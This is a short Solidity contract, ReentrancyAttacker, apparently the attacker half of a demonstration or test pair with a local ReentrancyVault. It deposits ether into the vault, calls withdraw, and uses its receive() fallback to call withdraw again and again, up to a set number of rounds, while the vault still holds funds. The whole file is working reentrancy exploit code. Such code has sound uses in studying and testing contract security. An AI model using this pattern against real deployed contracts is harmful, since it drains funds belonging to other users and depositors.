// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ReentrancyVault.sol";

contract ReentrancyAttacker {
    ReentrancyVault public vault;
    uint256 public targetAmount;
    uint256 public rounds;
    uint256 public maxRounds;

    constructor(ReentrancyVault _vault) {
        vault = _vault;
    }

    function attack(uint256 _amount, uint256 _maxRounds) external payable {
        targetAmount = _amount;
        maxRounds = _maxRounds;

        vault.deposit{value: msg.value}();
        vault.withdraw(_amount);
    }

    receive() external payable {
        if (rounds < maxRounds && address(vault).balance >= targetAmount) {
            rounds++;
            vault.withdraw(targetAmount);
        }
    }
}
